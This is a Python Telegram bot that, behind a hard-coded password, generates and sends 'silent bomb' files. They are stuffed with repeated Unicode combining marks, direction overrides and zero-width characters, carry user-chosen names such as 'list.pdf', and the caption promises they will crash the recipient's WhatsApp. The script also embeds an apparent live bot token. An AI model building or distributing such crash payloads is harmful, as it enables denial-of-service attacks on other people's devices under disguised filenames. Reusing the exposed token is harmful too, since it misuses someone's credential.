import logging
import sqlite3
import os
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, MessageHandler, filters, ContextTypes, ConversationHandler

# ১. লগিং সেটআপ
logging.basicConfig(level=logging.WARNING)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
CORRECT_PASSWORD = "MIZANUR RAHMAN"

# ৩. কনভারসেশন স্টেটস
WAITING_FOR_PASSWORD = 1
WAITING_FOR_FILENAME = 2

# ৪. ডাটাবেস
def init_db():
    conn = sqlite3.connect('mr_dev_silent.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৫. পারমাণবিক পেলোড জেনারেটর (No Extension Logic)
async def generate_silent_payload(filename, status_msg):
    # এখানে কোনো অটোমেটিক .txt যোগ করা হবে না
    file_path = filename 
    
    # মারাত্মক ক্রাশ প্যাটার্ন
    atomic_pattern = (
        "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 400 + 
        "\u202E\u202D" * 200 +                             
        "\u200B\u200C\u200D\uFEFF" * 250 +                 
        "☢️" * 50                                          
    )
    
    header = f"☢️_SILENT_DEATH_BY_M_R_DEV_☢️\n"
    deadly_block = (header + atomic_pattern) * 12 
    
    try:
        await status_msg.edit_text(f"🚀 বারুদ ভরা হচ্ছে: '{filename}'...")
        with open(file_path, "w", encoding="utf-8") as f:
            for i in range(1, 16):
                f.write(deadly_block)
        return file_path
    except Exception:
        return None

# ৬. হ্যান্ডলার ফাংশনসমূহ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🚀 CREATE SILENT BOMB")], [KeyboardButton("📊 STATUS")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("🔥 **M R DEVELOPER SILENT PANEL** 🔥\nখেলার জন্য বাটন চাপুন।", reply_markup=reply_markup)
    return ConversationHandler.END

async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 **পাসওয়ার্ড দিন:**", reply_markup=ReplyKeyboardRemove())
    return WAITING_FOR_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == CORRECT_PASSWORD:
        await update.message.reply_text("✅ এক্সেস গ্রান্টেড!\n\nএখন **ফাইলের নাম** কী দিবেন?\n(সরাসরি নাম লিখুন, যেমন: `transection` বা `list.pdf`)")
        return WAITING_FOR_FILENAME
    await update.message.reply_text("❌ ভুল পাসওয়ার্ড!")
    return WAITING_FOR_PASSWORD

async def create_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    custom_name = update.message.text.strip().replace(" ", "_")
    status = await update.message.reply_text("☢️ বোমা তৈরি হচ্ছে...")
    
    file_path = await generate_silent_payload(custom_name, status)
    
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as doc:
                await update.message.reply_document(
                    document=doc, 
                    caption=f"🔥 **SILENT BOMB READY!**\n\nফাইলের নাম: `{file_path}`\n\nএটি পাঠালে স্ক্যামারের হোয়াটসঅ্যাপ এটি নিজের ভেতরেই ওপেন করতে গিয়ে ক্রাশ খাবে।"
                )
            # আপডেট স্ট্যাটাস
            conn = sqlite3.connect('mr_dev_silent.db')
            cur = conn.cursor()
            cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
            conn.commit()
            conn.close()
        except Exception:
            await update.message.reply_text("❌ এরর হয়েছে!")
        finally:
            if os.path.exists(file_path): os.remove(file_path)
    
    await status.delete()
    return ConversationHandler.END

# ৭. রানার
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()
    conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🚀 CREATE SILENT BOMB$'), ask_password)],
        states={
            WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
            WAITING_FOR_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_and_send)],
        },
        fallbacks=[MessageHandler(filters.COMMAND, start)],
    )
    application.add_handler(conv)
    application.add_handler(MessageHandler(filters.Regex('^/start$'), start))
    application.run_polling()

if __name__ == '__main__':
    main()
    
